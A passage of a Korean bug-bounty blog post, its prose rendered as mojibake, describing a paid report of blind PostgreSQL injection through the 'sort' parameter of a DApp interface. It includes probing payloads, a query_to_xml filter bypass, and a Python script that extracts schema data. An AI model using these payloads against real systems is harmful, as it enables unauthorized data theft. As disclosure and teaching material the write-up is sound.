---
layout: post
title:  "Blind PostgreSQL Injection in DApp Interface (Paid USD $20,000 Bounty)"
author: "munsiwoo"
comments: true
tags: [Research]
---

ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬2íŒ€ ë¬¸ì‹œìš°

# Blind PostgreSQL Injection in DApp Interface (Paid USD $20,000 Bounty)


ë³¸ ê¸€ì€ ë¦¬ì–¼ ì›”ë“œì˜ Web3 ì¸í„°í˜ì´ìŠ¤ì—ì„œ ì°¾ì•„ ì œë³´í•œ Critical ì·¨ì•½ì ê³¼ ìµìŠ¤í”Œë¡œì‡ ê²½í—˜ì— ëŒ€í•œ í¬ìŠ¤íŒ…ì…ë‹ˆë‹¤.

## Summary

DApp(Decentralized Application)ì€ ë¶„ì‚°í˜• ì• í”Œë¦¬ì¼€ì´ì…˜ìœ¼ë¡œ, ë¸”ë¡ì²´ì¸ ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ ìƒí˜¸ì‘ìš©í•˜ê³  ë°ì´í„°ë¥¼ ê³µìœ í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ë”ë¦¬ì›€ ë©”ì¸ë„·, ë°”ì´ë‚¸ìŠ¤ ìŠ¤ë§ˆíŠ¸ ì²´ì¸(BSC) ë“± ë©”ì´ì €í•œ ìƒíƒœê³„ë¥¼ í¬í•¨í•´ ë‹¤ì–‘í•œ ë„¤íŠ¸ì›Œí¬ê°€ ì¡´ì¬í•©ë‹ˆë‹¤.

ì´ë”ë¦¬ì›€ê³¼ ê°™ì´ ìŠ¤ë§ˆíŠ¸ ê³„ì•½(Smart Contract)ì„ ì§€ì›í•˜ëŠ” ë„¤íŠ¸ì›Œí¬ì— ì†”ë¦¬ë””í‹°, ë°”ì´í¼ ë“±ì˜ í”„ë¡œê·¸ë˜ë° ì–¸ì–´ë¥¼ í™œìš©í•´ ì»¨íŠ¸ë™íŠ¸ë¥¼ ê°œë°œí•˜ì—¬ ì˜¬ë¦° ë‹¤ìŒ ê¸°ì¡´ì˜ ì›¹ ì‚¬ì´íŠ¸ì— ì—°ê²°í•´ ìƒí˜¸ì‘ìš©í•˜ì—¬ ë™ì‘í•˜ëŠ” ê²ƒì´ ì¼ë°˜ì ì…ë‹ˆë‹¤. ì›¹ ì‚¬ì´íŠ¸ ì—†ì´ ì»¨íŠ¸ë™íŠ¸ ë‹¨ë…ìœ¼ë¡œ ì‚¬ìš©í•  ìˆœ ìˆì§€ë§Œ ì‚¬ìš©ìì˜ í¸ì˜ë¥¼ ìœ„í•´ ê¸°ì¡´ ì›¹ ì‚¬ì´íŠ¸ì™€ ì—°ë™í•˜ì—¬ ì£¼ë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì›¹ ì‚¬ì´íŠ¸ë¥¼ Web3UI, DApp ì¸í„°í˜ì´ìŠ¤ë¼ê³  í•˜ë©° DAppê³¼ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆëŠ” ìƒˆë¡œìš´ êµ¬ì„± ìš”ì†Œë¥¼ ê°–ì¶”ê³  ìˆì–´ì•¼ í•©ë‹ˆë‹¤. (web3.js ë“±)

ì´ê²ƒì€ ê¸°ì¡´ ì›¹ ì‚¬ì´íŠ¸ì—ì„œ ë°œìƒí–ˆë˜ ì·¨ì•½ì  ì—­ì‹œ ë™ì¼í•˜ê²Œ ë°œìƒí•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤. í•œê°€ì§€ ì¬ë°ŒëŠ” ì‚¬ì‹¤ì€ ê¸°ì¡´ ì›¹ ì‚¬ì´íŠ¸ì—ì„œì˜ XSSëŠ” ì£¼ë¡œ ì¿ í‚¤ íƒˆì·¨ ë° ì•…ì„± ì‚¬ì´íŠ¸ë¡œ ë¦¬ë‹¤ì´ë ‰ì…˜ ìš©ë„ë¡œ ì‚¬ìš©ë˜ì—ˆê¸°ì—(ë‹¤ë¥¸ ì·¨ì•½ì ê³¼ ì—°ê³„í•˜ëŠ” ê²½ìš°ëŠ” ì˜ˆì™¸) ë²„ê·¸ë°”ìš´í‹°ì—ì„œë„ Server-side ì·¨ì•½ì ì— ë¹„í•´ Client-side ì·¨ì•½ì ì€ íŒŒê¸‰ë ¥ê³¼ ì˜í–¥ë ¥ì„ ë‚®ê²Œ ì±…ì •í–ˆë‹¤ë©´, DApp ì¸í„°í˜ì´ìŠ¤ì—ì„œëŠ” Client-side ì·¨ì•½ì  ë˜í•œ ë†’ê²Œ ì±…ì •í•©ë‹ˆë‹¤.

ì´ìœ ëŠ” ëŒ€ë¶€ë¶„ì˜ DAppì€ Metamaskë‚˜ Liqualityì™€ ê°™ì€ ë¸Œë¼ìš°ì € ì§€ê°‘ê³¼ ì—°ë™í•´ ì‚¬ìš©í• ë¿ë”ëŸ¬, XSSë¡œ ì›¹ì‚¬ì´íŠ¸ì˜ êµ¬ì„±ì„ ë³€ê²½í•  ìˆ˜ ìˆë‹¤ë©´ ìƒí˜¸ì‘ìš©í•˜ëŠ” DAppì˜ ì»¨íŠ¸ë™íŠ¸ ì£¼ì†Œë¥¼ ë³€ê²½í•˜ê±°ë‚˜ ì„ì˜ì˜ íŠ¸ëœì­ì…˜ì„ ìš”ì²­í•˜ëŠ” ë“± ì·¨ì•½ì  í™œìš©ë„ì™€ ì˜í–¥ë ¥ì´ ì»¤ì¡Œê¸° ë•Œë¬¸ì— Client-side ì·¨ì•½ì  ë˜í•œ Critical êµ°ì— ë“¤ì–´ê°€ëŠ” ê²½ìš°ê°€ ë§ì•„ì¡ŒìŠµë‹ˆë‹¤.

ê·¸ëŸ¼ Server-side ì·¨ì•½ì ì˜ íŒŒê¸‰ë ¥ì´ ë‚®ì•„ì¡Œëƒ í•˜ë©´, ê·¸ê±´ ë˜ ì•„ë‹™ë‹ˆë‹¤. DBë¥¼ ì‚¬ìš©í•˜ê³  ìˆëŠ” ê³³ì´ë¼ë©´ ìœ ì €ì˜ Private API Keyë‚˜ ê³„ì •ì„ í›”ì¹  ìˆ˜ ìˆê³  RCEê°€ ê°€ëŠ¥í•˜ë‹¤ë©´ í˜ì´ì§€ êµ¬ì„± ë˜ëŠ” ì„¤ì • ìì²´ë¥¼ ë³€ê²½í•´ë²„ë¦´ ìˆ˜ ìˆìœ¼ë‹ˆ ë” ì¹˜ëª…ì ì¼ ê²ë‹ˆë‹¤.

ì´ ê¸€ì—ì„  ì‹¤ì œ ìš´ì˜ì¤‘ì¸ DApp ì¸í„°í˜ì´ìŠ¤ì—ì„œ ì°¾ì•„ ì œë³´í•œ Server-side ì·¨ì•½ì (SQL Injection)ê³¼ **K-CTFê¸‰** ìµìŠ¤í”Œë¡œì‡ ê²½í—˜ì„ ë‹¤ë£¹ë‹ˆë‹¤.

## Find Vulnerability

ì§€ë‚œ 1ë…„ê°„ ì†”ë¦¬ë””í‹°ë¡œ ì‘ì„±ëœ ì»¨íŠ¸ë™íŠ¸ë¥¼ í¬í•¨í•˜ì—¬, ì´ëŸ¬í•œ ì»¨íŠ¸ë™íŠ¸ì™€ ì—°ë™ëœ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì¤‘ì ìœ¼ë¡œ ë²„ê·¸ í—ŒíŒ…ì„ í•´ì™”ìŠµë‹ˆë‹¤. ë‹¤ì–‘í•œ íƒ€ê²Ÿì„ ë³´ë©° ëŠë‚€ì ì€ ëŒ€ë¶€ë¶„ì´ ë¹„ìŠ·í•œ ìŠ¤í™ìœ¼ë¡œ ë°°í¬í•œë‹¤ëŠ” ê²ƒì¸ë°ìš”, ì£¼ë¡œ Nextjs(12~13) + Vercel ì¡°í•©ì˜ ì„œë²„ë¦¬ìŠ¤(Server-less) í˜•íƒœë¡œ ë§ì´ ë°°í¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•˜ì˜€ìŠµë‹ˆë‹¤.

ì´ë ‡ê²Œ ë°°í¬ëœ ì›¹ì€ ëŒ€ë¶€ë¶„ êµ¬ì¡°ê°€ ë‹¨ìˆœí–ˆìœ¼ë©° ì»¨íŠ¸ë™íŠ¸ì™€ ìƒí˜¸ì‘ìš©í•˜ëŠ” ê²ƒ ì™¸ì—ëŠ” ê¸°ëŠ¥ì´ ê±°ì˜ ì—†ì—ˆê¸°ì—, ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ìŠ¤íŒŸ(ê¿€ë°­)ì´ í•œì •ë˜ì–´ ìˆë‹¤ê³  ìƒê°í–ˆìŠµë‹ˆë‹¤. (ëŒ€ë¶€ë¶„ webpackê³¼ ê°™ì€ ë²ˆë“¤ëŸ¬ë¥¼ ê±°ì³ ë‚˜ì˜¤ê¸°ì— ë¶„ì„ë„ ì‰½ì§€ ì•ŠìŠµë‹ˆë‹¤)

React ë²„ì „ì„ ì²´í¬í•˜ì—¬ ì›ë°ì´(1-DAY)ë¥¼ ì •ë¦¬í•´ì£¼ëŠ” ìŠ¤í¬ë¦½íŠ¸ëŠ” ì‘ì„±í•´ì„œ ì­‰ ëŒë ¤ë³´ì•˜ì§€ë§Œ, í° ìˆ˜í™•ì€ ì—†ì—ˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì„œ ì œê°€ ì„ íƒí•œ ê¸¸ì€ í”í•˜ì§€ ì•Šì€ ìŠ¤í™ì„ ê°€ì§„ ì¸í„°í˜ì´ìŠ¤ë¥¼ ë¨¼ì € ë³´ëŠ” ê²ƒì´ì—ˆëŠ”ë°ìš”. ë¨¼ì € ëª¨ë“  ì‚¬ì´íŠ¸ë¥¼ ëŒì•„ë‹¤ë‹ˆë©° ì‚¬ì´íŠ¸ë³„ë¡œ ê¸°ìˆ  ìŠ¤íƒì„ ì •ë¦¬/ë¶„ë¥˜í•œ ë’¤, ì—„ê²©í•˜ê²Œ ì„ ë³„í•œ ì‚¬ì´íŠ¸ë§Œ BurpSuiteë¥¼ ì‹¤í–‰í•œ ë‹¤ìŒ ì·¨ì•½ì ì„ ì°¾ì•„ ë‚˜ì„°ìŠµë‹ˆë‹¤.

ì´ê²ƒì€ ë‚˜ë¦„ í˜„ëª…í•œ ì„ íƒì´ì—ˆìŠµë‹ˆë‹¤. ìˆ˜ë§ì€ K-CTF ë¬¸ì œì™€ ë²„ê·¸ í—ŒíŒ…ì„ í†µí•´ ê°œì•ˆí•œ ì·¨ì•½ì  ì‚¬ë¥œì•ˆì´ ë¹›ì„ ë°œí–ˆë‹¤ê³ ë„ ë³¼ ìˆ˜ ìˆëŠ”ë°ìš”. (vendor ì´ë¦„ì€ ë‚˜ì¤‘ì— í—ˆë½í•˜ë©´ ê³µê°œí•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤)

```json
{
	"status":"online",
	"page":1,
	"sort":"tokenId",
	"order":"desc"
	"id":1
}
```

ìœ„ JSONì—ì„œ weak spotì„ ì°¾ìœ¼ì…¨ë‚˜ìš”?

ë¬¼ë¡  ë‹¤ë¥¸ íŒŒë¼ë¯¸í„°ë„ ì·¨ì•½í•  ìˆœ ìˆì§€ë§Œ, íŠ¹íˆ `sort`ì™€ `order` íŒŒë¼ë¯¸í„°ê°€ êµ‰ì¥íˆ ìˆ˜ìƒí•©ë‹ˆë‹¤. ê²½í—˜ìƒ ì¼ë°˜ì ìœ¼ë¡œ prepared statementì—ì„œ ë°ì´í„°ì˜ ê°’ì„ ë¹„êµ í•  ë• ë°”ì¸ë”©ì„ `?`ë‚˜ `%s` í‚¤ì›Œë“œë¡œ ì²˜ë¦¬í•œë‹¤ê³  í•´ë„, ORDER BYì ˆì— ë“¤ì–´ê°€ëŠ” ì»¬ëŸ¼ ì´ë¦„ì´ë‚˜ ì°¨ìˆœ(ASC/DESC)ì„ ì„¤ì •í•  ë•Œ ë˜‘ê°™ì´ `?`ë‚˜ `%s`ë¡œ ë°”ì¸ë”© í•˜ê²Œëœë‹¤ë©´ ì¿¼í„°ë¡œ ê°ì‹¸ì§„ stringìœ¼ë¡œ ì¸ì‹í•˜ê¸° ë•Œë¬¸ì— ê°œë°œìëŠ” SQL Syntax Errorë¥¼ ë§ì´í•˜ê²Œ ë©ë‹ˆë‹¤. ì—¬ê¸°ì„œ ëŒ€ì²˜ ë°©ë²•ì— ë”°ë¼ ì‹œíì–´ì½”ë”©ì— ëŠ¥ìˆ™í•œ ê°œë°œìì™€ ë¯¸ìˆ™í•œ ê°œë°œìë¡œ ë‚˜ë‰©ë‹ˆë‹¤.

ì‹œíì–´ì½”ë”©ì— ëŠ¥ìˆ™í•œ ê°œë°œìëŠ” Whitelistë¥¼ ì§€ì •í•˜ì—¬ ì‚¬ìš©ì ì…ë ¥ì„ ê²€ì‚¬í•˜ê±°ë‚˜ ì–¸ì–´ì—ì„œ ì§€ì›í•˜ëŠ” Built-in ê¸°ëŠ¥ì„ í†µí•´ ì•ˆì „í•˜ê²Œ êµ¬í˜„í•˜ëŠ” ë°˜ë©´, string concatìœ¼ë¡œ ì‚¬ìš©ì ì…ë ¥ì„ queryì— ê·¸ëŒ€ë¡œ ë„£ëŠ” ë¯¸ìˆ™í•œ ê°œë°œìê°€ ìˆìŠµë‹ˆë‹¤.

**ë¯¸ìˆ™í•œ ê°œë°œìê°€ ì‘ì„±í•œ ì½”ë“œ ì˜ˆì‹œ:**

```php
$sql = "SELECT * FROM table FROM id=? ORDER BY ${sort} ${order}";
```

ì œê°€ ë³´ì•˜ë˜ DApp ì¸í„°í˜ì´ìŠ¤ ê°œë°œìëŠ” ì–´ë–»ê²Œ ì²˜ë¦¬í–ˆì„ê¹Œìš”?
ë¨¼ì €, ì»¬ëŸ¼ ì´ë¦„ì´ ë“¤ì–´ê°€ëŠ” ê³³ì— ìˆ«ìë¥¼ ë„£ì–´ 1ì”© ì¦ê°€ì‹œì¼œë³´ì•˜ìŠµë‹ˆë‹¤.

```
"sort":"1" --> Normal response
"sort":"2" --> Normal response
"sort":"3" --> Normal response
...
"sort":"16" --> Normal response
"sort":"17" --> Unusual response with the message "Data not found"
```

16ê¹Œì§€ëŠ” ì •ìƒì ì¸ ì‘ë‹µì„ í•˜ë‹¤ê°€ 17ì—ì„œ ê¸°ì¡´ê³¼ ë‹¤ë¥¸ ì‘ë‹µì´ ì˜¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ë¶€í„° 1ì°¨ í–‰ë³µíšŒë¡œë¥¼ ëŒë ¤ë„ ë˜ê² ìŠµë‹ˆë‹¤. ëª¨ë“  DBê°€ ê·¸ë ‡ì§„ ì•Šì§€ë§Œ, ëŒ€ë¶€ë¶„ì˜ ê´€ê³„í˜• DBëŠ” ORDER BYì—ì„œ ì»¬ëŸ¼ëª… ëŒ€ì‹  ì»¬ëŸ¼ì˜ ìˆœì„œë¥¼ ìˆ«ìë¡œ ë„£ì–´ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`ORDER BY 3 DESC`ì´ë ‡ê²Œ í•˜ë©´ "ì„¸ë²ˆì§¸ ì»¬ëŸ¼ì„ ê¸°ì¤€ìœ¼ë¡œ ë‚´ë¦¼ì°¨ìˆœ ì •ë ¬í•˜ê² ë‹¤" ë¼ëŠ” ì˜ë¯¸ì…ë‹ˆë‹¤. ì—¬ê¸°ì„œ ë§Œì•½ ìˆ«ìê°€ ì»¬ëŸ¼ì˜ ê°œìˆ˜ë¥¼ ì´ˆê³¼í•˜ë©´ SQL Errorê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.

ì—¬ê¸°ì—ì„œ 2ì°¨ í–‰ë³µíšŒë¡œë¥¼ ëŒë¦¬ê¸° ìœ„í•´, ë‹¤ì–‘í•œ SQL ë¬¸ë²•ì„ í™œìš©í•˜ì—¬ SQL Injection ì·¨ì•½ì ì¸ì§€ í™•ì¸í•´ë³´ì•˜ìŠµë‹ˆë‹¤. ì²´í¬í•˜ëŠ” ë°©ë²•ì€ ë§ê² ì§€ë§Œ, ì €ëŠ” ì£¼ì„ì²˜ë¦¬(comment)ì™€ ê´„í˜¸, í•¨ìˆ˜ ë“± ë‹¤ì–‘í•œ ë°©ë²•ì„ í™œìš©í•´ ì·¨ì•½ì  ìœ ë¬´ì™€ DB ì¢…ë¥˜ë¥¼ ì²´í¬í•˜ì˜€ìŠµë‹ˆë‹¤.

```
"sort":"(tokenId)" --> Normal response
"sort":"tokenId)" --> Error

"sort":"tokenId/*AAAAAA*/" --> Normal response
"sort":"tokenId/**/AAAAAA" --> Error

"sort":"(/*B*/tokenId/*AAAAAA*/)/*B*/" --> Normal response
"sort":"(/*B*/ABCD/*AAAAAA*/)/*B*/" --> Error (ABCDì»¬ëŸ¼ì´ ì—†ì–´ì„œ ì˜¤ë¥˜ê°€ ë‚˜ëŠ”ê²ƒìœ¼ë¡œ ì¶”ì¸¡)
```

ê´„í˜¸ì™€ ì£¼ì„ì´ ì˜ ì‘ë™í•˜ëŠ” ê²ƒ ê°™ìŠµë‹ˆë‹¤.

```
"sort":"(SELECT(CHR(100)))"  --> Normal response
"sort":"(SELECT(SUBSTR('a',1,1)))" --> Normal response
"sort":"(SELECT(VERSION()))" --> Normal response
"sort":"(SELECT/**/current_user)" --> Normal response
"sort":"(SELECT(ABCD('a',1,1)))" --> Error
```

ìœ„ì˜ ì‘ë‹µ ê²°ê³¼ë¥¼ í†µí•´ SQL Injectionì´ ë°œìƒí•˜ëŠ”êµ¬ë‚˜ í™•ì‹ í–ˆìœ¼ë©°, ë‹¤ìŒì˜ queryë¡œ DB ì¢…ë¥˜ë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

```
"sort":"(SELECT(getpgusername()))" --> Normal response
"sort":"(SELECT(a()))" --> Error
```

PostgreSQLì—ë§Œ ì¡´ì¬í•˜ëŠ” `getpgusername`í•¨ìˆ˜ê°€ ì •ìƒì ìœ¼ë¡œ ì‘ë‹µí•˜ëŠ” ê²ƒì„ ë³´ì•„ íƒ€ê²Ÿì€ PostgreSQLì„ ì‚¬ìš©ì¤‘ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Exploitation

ì·¨ì•½ì ì„ ì œë³´í•˜ê¸° ìœ„í•´ì„œëŠ”, ì›í•˜ëŠ” ë°ì´í„°ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆëŠ”ì§€ ì¦ëª…í•˜ê¸° ìœ„í•œ PoC ì½”ë“œë¥¼ ì‘ì„±í•´ì•¼ í•©ë‹ˆë‹¤. ORDER BYì ˆì—ì„œ ë°œìƒí•œ SQL Injectionì´ë¯€ë¡œ ë¹„êµí•˜ëŠ” ê°’ì´ ì°¸ì¼ ë•Œì™€ ê±°ì§“ì¼ ë•Œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì •ë ¬ë˜ì–´ ì˜¤ëŠ” ì‘ë‹µì´ ë‹¤ë¥´ë‹¤ëŠ” ì ì„ ì´ìš©í•´ Blind SQL Injectionì„ ìˆ˜í–‰í–ˆìŠµë‹ˆë‹¤. ë‹¤ìŒì€ current_userë¥¼ ê°€ì ¸ì˜¤ê¸° ìœ„í•œ í˜ì´ë¡œë“œì…ë‹ˆë‹¤. (ìë™í™” ìŠ¤í¬ë¦½íŠ¸ëŠ” ë’¤ì— ì²¨ë¶€)

```
"sort": "id=(1+(SELECT\\nCASE\\nWHEN\\n((SELECT\\ncurrent_user)LIKE'{}%')\\nTHEN\\n1\\nELSE\\n0\\nEND))"
```

**ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ê²°ê³¼:**

```
extracted value: â–ˆ
extracted value: â–ˆâ–ˆ
extracted value: â–ˆâ–ˆâ–ˆ
...
extracted value: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
```

ì´ì œ ì‹¤ì œ ìœ ì € í…Œì´ë¸”ì— ì ‘ê·¼í•˜ì—¬ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆëŠ” PoCë¥¼ ì‘ì„±í•´ì•¼ í•©ë‹ˆë‹¤. (ì´ ë¶€ë¶„ì€ ê°œì¸ì •ë³´ì™€ ê´€ë ¨ëœ ë¶€ë¶„ì´ê¸°ì— vendorì™€ ì¶©ë¶„íˆ ì†Œí†µí•˜ì˜€ìœ¼ë©° vendorì˜ ìš”ì²­ ë° í—ˆë½ì´ ìˆì—ˆìŠµë‹ˆë‹¤)

PostgreSQLë˜í•œ MySQLê³¼ ë§ˆì°¬ê°€ì§€ë¡œ `information_schema` DBì— ëª¨ë“  ìŠ¤í‚¤ë§ˆ ì •ë³´ê°€ ì €ì¥ë˜ì–´ ìˆê¸°ì— í•´ë‹¹ DBì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ì„œëŠ” `.`ì‚¬ìš©ì´ ë¶ˆê°€í”¼í•©ë‹ˆë‹¤. (`information_schema.columns` ë“±)

ì—¬ê¸°ì„œ í•œê°€ì§€ ë¬¸ì œì ì€ `sort`íŒŒë¼ë¯¸í„°ë¡œ `.` ë¬¸ìì™€ whitespaceë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ë‹¤ëŠ” ì• ë¡œì‚¬í•­ì´ ìˆì—ˆëŠ”ë°ìš”. Lord of SQL Injection ì›Œê²Œì„ì„ í†µí•´ ë‹¨ë ¨ëœ ì €ì—ê²Œ ì´ê²ƒì€ ë” ì´ìƒ ì• ë¡œì‚¬í•­ì´ ì•„ë‹ˆì—ˆìŠµë‹ˆë‹¤. (Shout out Rubiya)

PostgreSQLì—ëŠ” `query_to_xml`ì´ë¼ëŠ” ì¢‹ì€ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì²«ë²ˆì§¸ ì¸ìë¡œ queryë¥¼ ì „ë‹¬í•˜ë©´ í•´ë‹¹ queryë¥¼ ì‹¤í–‰í•œ ê²°ê³¼ë¥¼ xmlë¡œ ë°˜í™˜í•´ì£¼ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤.

**Query:**

```
SELECT query_to_xml('SELECT VERSION()',true,true,'');
```

**ê²°ê³¼:**

```
<row xmlns:xsi="<http://www.w3.org/2001/XMLSchema-instance>"><version>PostgreSQL 10.21 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.4.7 20120313 (Red Hat 4.4.7-23), 64-bit</version> </row>
```

ì´ë ‡ê²Œ ì²«ë²ˆì§¸ ì¸ìë¥¼ stringìœ¼ë¡œ ë°›ê¸° ë•Œë¬¸ì— `CHR`í•¨ìˆ˜ì™€ string concat(`||`)ì„ ì ì ˆí•˜ê²Œ í™œìš©í•˜ì—¬ `.`ì„ ì‚¬ìš©í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

```
SELECT xmlserialize(document(query_to_xml('SELECT/**/'''||CHR(46)||'''/**/AS/**/x',true,true,'')) AS text);
```

ì´ì œ `information_schema.columns`ì—ì„œ ìŠ¤í‚¤ë§ˆ ì •ë³´ë¥¼ ëª¨ì¡°ë¦¬ ë½‘ì•„ì˜¬ ëª¨ë“  ì¤€ë¹„ê°€ ì™„ë£Œë˜ì—ˆìŠµë‹ˆë‹¤.

**Payload:**

```
"sort":"id=(1+(SELECT\\nCASE\\nWHEN\\n((xmlserialize(document(query_to_xml('SELECT/**/(column_name)x/**/FROM/**/information_schema'||CHR(46)||'columns/**/LIMIT/**/1/**/OFFSET/**/1',true,true,''))\\nAS\\ntext))LIKE'%<x>{}%')\\nTHEN\\n1\\nELSE\\n0\\nEND))"
```

**Exploit(Python):**

```python
import requests
import json
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

url = "â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ"
jwt = "â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ"

headers = {
    "Host": "â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Authorization": f"Bearer {jwt}",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
    "Origin": "â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,ko;q=0.8,zh;q=0.7,zh-CN;q=0.6,la;q=0.5,und;q=0.4,lb;q=0.3,vi;q=0.2",
    "Connection": "close"
}
data = {
    "parameters": [{
        "status":0,
        "page":1,
        "sort":":INJECT POINT:",
        "order":"desc"
        "id":1
    }],
}
payload = "id=(1+(SELECT CASE WHEN ((xmlserialize(document(query_to_xml('SELECT/**/(column_name)x/**/FROM/**/information_schema'||CHR(46)||'columns/**/LIMIT/**/1/**/OFFSET/**/1',true,true,'')) AS text))LIKE'%<x>{}%') THEN 1 ELSE 0 END))".replace(' ', '\\n')
result = ""

for i in range(100):
    for s in '123456789abcdefghijklmnopqrstuvwxyz:_':
        data['parameters'][0]['sort'] = payload.format(result + s)
        json_data = json.dumps(data)
        response = json.loads(requests.post(url, headers=headers, data=json_data, verify=False).text)

        if response['id'] == 55:
            result += s
            break

    print('extracted value: ', result)
```

ì´ë ‡ê²Œ `information_schema`ì— ì ‘ê·¼í•˜ì—¬ í…Œì´ë¸” ì •ë³´ì™€ ì»¬ëŸ¼ ëª…ì„ ì¶”ì¶œí–ˆìŠµë‹ˆë‹¤. ìœ„ì™€ ë™ì¼í•œ ë°©ë²•ìœ¼ë¡œ ìœ ì € í…Œì´ë¸”ì— ì ‘ê·¼í•´ ë°ì´í„°ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

ì°¸ê³ ë¡œ Pythonì—ì„œ requestsë¥¼ í™œìš©í•œ HTTP ìš”ì²­ ì½”ë“œë¥¼ ì‰½ê²Œ ì‘ì„±í•  ìˆ˜ ìˆë„ë¡ ë„ì™€ì£¼ëŠ” ì„œë¹„ìŠ¤ê°€ ìˆìŠµë‹ˆë‹¤. ì œê°€ ë§Œë“¤ì—ˆì§€ë§Œ ì§€ì¸ë“¤ì€ ìš”ê¸´í•˜ê²Œ ì˜ ì‚¬ìš©í•˜ê³  ìˆìœ¼ë‹ˆ ì—¬ëŸ¬ë¶„ë„ ì‚¬ìš©í•´ë³´ì„¸ìš”.

Python request maker: [https://withphp.com/prm/](https://withphp.com/prm/)

## Conclusion

![https://blog.munsiwoo.kr/wp-content/uploads/2023/03/1.png](https://blog.munsiwoo.kr/wp-content/uploads/2023/03/1.png)

ì´ë ‡ê²Œ ë¦¬ì–¼ ì›”ë“œì—ì„œ Blind SQL Injectionì„ í†µí•´ ë°”ìš´í‹°ë¥¼ ì–»ê¸°ê¹Œì§€ ì—¬ì •ì— ëŒ€í•´ ì£¼ì €ë¦¬ ì ì–´ë³´ì•˜ìŠµë‹ˆë‹¤. ê±°ì˜ 2ë…„ë§Œì˜ í¬ìŠ¤íŒ…ì´ë¼ ë˜ ì–¸ì œ ëŒì•„ì˜¬ì§„ ëª¨ë¥´ê² ì§€ë§Œ ë‹¤ìŒ í¬ìŠ¤íŒ…ì—ì„  Nextjs + Vercel ì¡°í•©ì—ì„œ ë°œê²¬í–ˆë˜ Critical ì·¨ì•½ì  ì¼€ì´ìŠ¤ì— ëŒ€í•´ì„œ ë‹¤ë¤„ë³´ê² ìŠµë‹ˆë‹¤.

ì—¬ë‹´ìœ¼ë¡œ ê³ ë“±í•™ìƒ ì‹œì ˆë¶€í„° ê°™ì´ CTFë¥¼ í•´ì˜¤ë˜ ì¹œêµ¬ë“¤ê³¼ í•¨ê»˜ í¥ë¶€(Heung)ë¼ëŠ” DAppì— íŠ¹í™”ëœ ë²„ê·¸ë°”ìš´í‹° íŒ€ì„ ê¾¸ë ¤ ì—´ì‹¬íˆ ë²„ê·¸ë°”ìš´í‹° í™œë™ì„ í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë‹¤ì–‘í•œ ì·¨ì•½ì ì„ ì°¾ì•„ ì œë³´í•˜ê³  ë²„ê·¸ ì¼€ì´ìŠ¤ë¥¼ ê³µìœ í•˜ë©° ì„œë¡œ ìœˆìœˆí•˜ê³  ìˆëŠ”ë° ë‚˜ì¤‘ì—” ì†Œê·œëª¨ì˜ ë²„ê·¸ ë°”ìš´í‹° ì„¸ë¯¸ë‚˜ë„ ì—´ì–´ë³¼ê¹Œ í•˜ëŠ”ë° ì˜ ë ì§„ ëª¨ë¥´ê² ë„¤ìš”. ì´ë ‡ê²Œ ì·¨ì•½ì ì— ëŒ€í•´ ì§ì ‘ í¬ìŠ¤íŒ…í•˜ëŠ”ê±´ 